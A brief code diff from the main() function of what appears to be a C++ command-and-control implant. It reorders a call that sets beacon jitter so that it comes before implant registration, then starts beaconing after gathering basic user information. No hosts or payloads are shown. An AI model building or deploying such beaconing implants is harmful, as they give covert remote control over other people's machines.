@@ -10,8 +10,9 @@ int main() {
 	BasicUserInformation basicUserInfo; // 
 	Implant implant = Implant(basicUserInfo);
 
+	implant.setJitter(3000); // Can set this to whatever you want.
+
 	implant.RegisterImplant();
-	implant.setJitter(3000);
 	implant.StartBeacon();
 
 	return 0;
